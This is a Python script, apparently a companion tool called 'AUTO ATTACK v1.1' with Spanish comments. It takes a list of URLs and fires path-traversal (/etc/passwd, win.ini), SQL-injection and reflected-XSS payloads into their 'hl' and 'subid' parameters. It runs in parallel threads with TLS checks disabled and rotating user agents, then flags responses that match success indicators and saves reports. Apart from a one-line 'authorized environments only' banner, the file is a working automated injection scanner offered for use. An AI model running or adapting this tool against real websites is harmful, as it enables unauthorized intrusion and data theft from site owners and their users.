#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║   🔥 AUTO ATTACK v1.1 — Pruebas de Inyección Automatizadas      ║
║   Complemento para Link Analyzer PRO v5.2                        ║
║   CREADO POR : Yoandis Rodríguez                                 ║
║   GITHUB     : https://github.com/YoandisR                       ║
║   ⚠️  USAR SOLO EN ENTORNOS AUTORIZADOS                         ║
╚══════════════════════════════════════════════════════════════════╝

Prueba sobre URLs que contienen los parámetros:
  - hl (parámetro de idioma)
  - subid (parámetro de identificación)

Payloads:
  - Path traversal (LFI)
  - SQL injection (boolean-based, union)
  - Cross-Site Scripting (XSS reflejado)

Uso:
  python3 auto_attack.py                 # Usa urls_200_limpias.txt
  python3 auto_attack.py --file m.txt    # Archivo específico
  python3 auto_attack.py --quick         # Solo payloads básicos
"""

import os
import sys
import time
import json
import urllib3
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from collections import defaultdict
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] Instala requests y beautifulsoup4: pip install requests beautifulsoup4 --break-system-packages")
    sys.exit(1)

# ==============================================================================
# COLORES (misma paleta que Link Analyzer PRO v5.2)
# ==============================================================================
class C:
    CYAN    = '\033[96m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    MAGENTA = '\033[35m'
    RED     = '\033[91m'
    WHITE   = '\033[97m'
    GRAY    = '\033[90m'
    BLUE    = '\033[94m'
    ORANGE  = '\033[38;5;208m'
    BOLD    = '\033[1m'
    END     = '\033[0m'

# ==============================================================================
# CONFIGURACIÓN
# ==============================================================================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
EXPORTS_DIR = os.path.join(SCRIPT_DIR, 'workspace', 'exports')
DEFAULT_INPUT = os.path.join(EXPORTS_DIR, 'urls_200_limpias.txt')

# Payloads clasificados
PAYLOADS = {
    'path_traversal': [
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..;/..;/..;/etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..\\..\\..\\boot.ini',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    ],
    'sql_injection': [
        "'",
        "''",
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1' ORDER BY 1--",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM users) IS NOT NULL--",
        "OR 1=1",
        "OR 1=1--",
        "1 AND 1=1",
    ],
    'xss': [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
    ]
}

# Indicadores de éxito en respuesta
INDICADORES = {
    'path_traversal': ['root:', 'bin/bash', 'drivers', '[extensions]', 'boot loader'],
    'sql_injection': ['sql syntax', 'mysql', 'ora-', 'unclosed quotation', 'you have an error', 'warning: mysql', 'syntax error', 'odbc', 'microsoft ole db'],
    'xss': ['<script>alert', 'onerror=alert', 'svg onload', 'javascript:alert']
}

# ==============================================================================
# CLASE DE PRUEBAS CON VISUALIZACIÓN EN TIEMPO REAL
# ==============================================================================
class AutoAttacker:
    def __init__(self, urls_file, quick_mode=False):
        self.urls_file = urls_file
        self.quick_mode = quick_mode
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=20)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        ]
        self.ua_index = 0
        self.results = []
        self.total_tests = 0
        self.completed = 0
        self.start_time = None

    def _next_ua(self):
        ua = self.user_agents[self.ua_index % len(self.user_agents)]
        self.ua_index += 1
        return ua

    def _modify_url_param(self, url, param, value):
        parsed = urlparse(url)
        query = parse_qs(parsed.query, keep_blank_values=True)
        query[param] = [value]
        new_query = urlencode(query, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))
        return new_url

    def _analyze_response(self, response, payload, category):
        content = response.text.lower()
        status = response.status_code
        length = len(content)
        indicators_found = []
        for ind in INDICADORES.get(category, []):
            if ind.lower() in content:
                indicators_found.append(ind)
        return {
            'status': status,
            'length': length,
            'indicators': indicators_found,
            'vulnerable': len(indicators_found) > 0
        }

    def test_url(self, url, param, payload, category):
        """Envía una petición con el payload en el parámetro, midiendo tiempo y mostrando en vivo."""
        test_url = self._modify_url_param(url, param, payload)
        headers = {
            'User-Agent': self._next_ua(),
            'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
            'Accept-Language': 'es,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
        }
        t_start = time.time()
        try:
            r = self.session.get(test_url, headers=headers, timeout=8, verify=False, allow_redirects=True)
            elapsed = time.time() - t_start
            analysis = self._analyze_response(r, payload, category)
            result = {
                'url_original': url,
                'param': param,
                'payload': payload,
                'category': category,
                'test_url': test_url,
                'status_code': analysis['status'],
                'response_length': analysis['length'],
                'indicators': analysis['indicators'],
                'vulnerable': analysis['vulnerable'],
                'elapsed': elapsed,
                'error': None
            }
        except Exception as e:
            elapsed = time.time() - t_start
            result = {
                'url_original': url,
                'param': param,
                'payload': payload,
                'category': category,
                'test_url': test_url,
                'status_code': 0,
                'response_length': 0,
                'indicators': [],
                'vulnerable': False,
                'elapsed': elapsed,
                'error': str(e)
            }

        # Visualización en tiempo real (biometría)
        self._visualizar(result)
        return result

    def _visualizar(self, result):
        """Muestra cada prueba en vivo con formato táctico (similar a Link Analyzer PRO)."""
        ts = datetime.now().strftime('%H:%M:%S')
        status = result['status_code']
        cat = result['category'].upper()
        # Truncar URL para que no desborde
        url_short = result['url_original'][:50] + '...' if len(result['url_original']) > 50 else result['url_original']
        elapsed = result['elapsed']

        if status == 0:
            color_status = C.YELLOW
            status_str = "TIMEOUT"
        else:
            color_status = C.GREEN if status < 400 else C.RED
            status_str = str(status)

        # Imprimir línea de progreso
        sys.stdout.write(
            f"{C.MAGENTA}[{ts}]{C.END} "
            f"{color_status}[{status_str:>4}]{C.END} "
            f"{C.CYAN}{cat:<12}{C.END} "
            f"{C.WHITE}{url_short:<52}{C.END} "
            f"{C.YELLOW}{elapsed:.2f}s{C.END}\n"
        )
        sys.stdout.flush()

        # Si la prueba fue vulnerable, destacarlo con alerta
        if result['vulnerable']:
            print(f"  {C.RED}{C.BOLD}⚠ ALERTA: Posible vulnerabilidad detectada en {result['category']}{C.END}")
            print(f"     {C.GRAY}Payload: {result['payload']}{C.END}")
            print(f"     {C.GRAY}Indicadores: {', '.join(result['indicators'])}{C.END}")

    def run(self):
        print(f"{C.CYAN}[*] Cargando URLs desde: {self.urls_file}{C.END}")
        with open(self.urls_file, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]

        # Filtrar URLs con los parámetros de interés
        target_urls = []
        for u in urls:
            parsed = urlparse(u)
            qs = parse_qs(parsed.query)
            if 'hl' in qs or 'subid' in qs:
                target_urls.append(u)

        print(f"{C.GREEN}✓{C.END} Total URLs: {len(urls)}")
        print(f"{C.YELLOW}✓{C.END} URLs con parámetros hl/subid: {len(target_urls)}")
        if not target_urls:
            print(f"{C.RED}[!] No se encontraron URLs con parámetros objetivo.{C.END}")
            return

        # Seleccionar payloads según modo
        if self.quick_mode:
            payloads_to_use = {
                'path_traversal': PAYLOADS['path_traversal'][:3],
                'sql_injection': PAYLOADS['sql_injection'][:3],
                'xss': PAYLOADS['xss'][:3],
            }
        else:
            payloads_to_use = PAYLOADS

        # Calcular total de pruebas
        total_tests = 0
        for url in target_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params.keys():
                if param not in ('hl', 'subid'):
                    continue
                for cat, plist in payloads_to_use.items():
                    total_tests += len(plist)
        self.total_tests = total_tests

        print(f"{C.CYAN}[*] Programando {total_tests} pruebas...{C.END}")
        print(f"{C.CYAN}[*] Visualización en tiempo real activada.{C.END}\n")
        self.start_time = time.time()

        # Ejecutar pruebas en paralelo (8 workers) pero con visualización inmediata
        futures = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            for url in target_urls:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                for param in params.keys():
                    if param not in ('hl', 'subid'):
                        continue
                    for cat, plist in payloads_to_use.items():
                        for payload in plist:
                            fut = executor.submit(self.test_url, url, param, payload, cat)
                            futures.append(fut)
                            # Pequeña pausa para no saturar el servidor
                            time.sleep(0.05)

            # Recolectar resultados (ya se mostraron en vivo)
            self.results = [fut.result() for fut in futures]

        # Guardar reporte
        self._save_report()

    def _save_report(self):
        """Genera reporte en texto y JSON, y muestra resumen de rendimiento."""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        txt_file = os.path.join(EXPORTS_DIR, f'attack_results_{timestamp}.txt')
        json_file = os.path.join(EXPORTS_DIR, f'attack_results_{timestamp}.json')

        # Contar vulnerables por categoría
        vuln_counts = defaultdict(int)
        for res in self.results:
            if res['vulnerable']:
                vuln_counts[res['category']] += 1

        # Métricas de rendimiento
        elapsed_total = time.time() - self.start_time
        tests_per_second = len(self.results) / elapsed_total if elapsed_total > 0 else 0

        # Construir reporte
        lines = []
        def L(s=''): lines.append(s)

        L("=" * 80)
        L("  INFORME DE ATAQUE AUTOMATIZADO — AUTO ATTACK v1.1")
        L(f"  Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        L(f"  Fuente: {os.path.basename(self.urls_file)}")
        L("=" * 80)
        L()
        L(f"  Pruebas realizadas: {len(self.results)}")
        L(f"  Tiempo total       : {elapsed_total:.2f} segundos")
        L(f"  Velocidad          : {tests_per_second:.2f} pruebas/segundo")
        L(f"  Vulnerabilidades detectadas: {sum(vuln_counts.values())}")
        L()
        for cat, cnt in vuln_counts.items():
            L(f"    {cat.upper()}: {cnt}")
        L()
        L("─" * 80)
        L("  DETALLE DE PRUEBAS VULNERABLES")
        L("─" * 80)
        L()

        vulnerable_found = False
        for res in self.results:
            if res['vulnerable']:
                vulnerable_found = True
                L(f"[VULNERABLE] {res['category'].upper()}")
                L(f"  URL original: {res['url_original']}")
                L(f"  Parámetro   : {res['param']}")
                L(f"  Payload     : {res['payload']}")
                L(f"  URL de prueba: {res['test_url']}")
                L(f"  Código HTTP : {res['status_code']}")
                L(f"  Longitud    : {res['response_length']}")
                L(f"  Indicadores : {', '.join(res['indicators'])}")
                L()

        if not vulnerable_found:
            L("  No se detectaron vulnerabilidades en ninguna prueba.")
            L()

        L("=" * 80)
        L("  FIN DEL INFORME")
        L("=" * 80)

        with open(txt_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(lines))

        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, ensure_ascii=False, indent=2)

        print(f"\n{C.GREEN}✓{C.END} Reporte guardado:")
        print(f"    {txt_file}")
        print(f"    {json_file}")
        print(f"\n{C.MAGENTA}╔{'═'*60}╗{C.END}")
        print(f"{C.MAGENTA}║{C.END}  {C.CYAN}{C.BOLD}RESUMEN DE RENDIMIENTO{C.END}{' '*30}{C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}║{C.END}  Pruebas       : {len(self.results):>6}                         {C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}║{C.END}  Tiempo total  : {elapsed_total:>6.2f} segundos                 {C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}║{C.END}  Velocidad     : {tests_per_second:>6.2f} pruebas/s              {C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}║{C.END}  Vulnerables   : {sum(vuln_counts.values()):>6}                         {C.MAGENTA}║{C.END}")
        print(f"{C.MAGENTA}╚{'═'*60}╝{C.END}")

# ==============================================================================
# ENTRY POINT
# ==============================================================================
def main():
    args = sys.argv[1:]
    quick = '--quick' in args
    custom_file = None
    for i, arg in enumerate(args):
        if arg == '--file' and i+1 < len(args):
            custom_file = args[i+1]
            break
    if custom_file:
        input_file = custom_file
    else:
        input_file = DEFAULT_INPUT

    if not os.path.isfile(input_file):
        print(f"{C.RED}[!] Archivo no encontrado: {input_file}{C.END}")
        print(f"{C.YELLOW}Ejecuta primero: python3 filtrar_200.py{C.END}")
        sys.exit(1)

    print(f"\n{C.CYAN}{C.BOLD}🔥 AUTO ATTACK v1.1 — Pruebas de Inyección{C.END}")
    print(f"{C.GRAY}   Complemento para Link Analyzer PRO v5.2{C.END}")
    print(f"{C.GRAY}   Sólo para entornos autorizados. Uso bajo tu responsabilidad.{C.END}\n")

    attacker = AutoAttacker(input_file, quick_mode=quick)
    attacker.run()

if __name__ == '__main__':
    main()
